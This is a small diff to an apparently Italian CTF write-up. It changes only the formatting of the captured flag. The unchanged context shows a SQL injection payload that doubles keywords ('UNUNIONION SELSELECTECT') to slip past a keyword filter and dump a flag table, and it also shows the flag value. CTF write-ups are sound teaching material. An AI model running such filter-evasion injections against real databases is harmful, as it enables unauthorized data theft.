@@ -79,4 +79,7 @@ Come si vede, all'interno del db è presente la tabella *qua_trovi_la_tua_flag*,
 ``` sql
 ' UNUNIONION SELSELECTECT * FRFROMOM qua_trovi_la_tua_flag ORDER BY email DESC#
 ```
-Ora ho la flag: **flag{1_d0n7_w4n7_70_w41t_ju57_61v3_m3_fl4g!}**
+Ora ho la flag: 
+```
+flag{1_d0n7_w4n7_70_w41t_ju57_61v3_m3_fl4g!}
+```
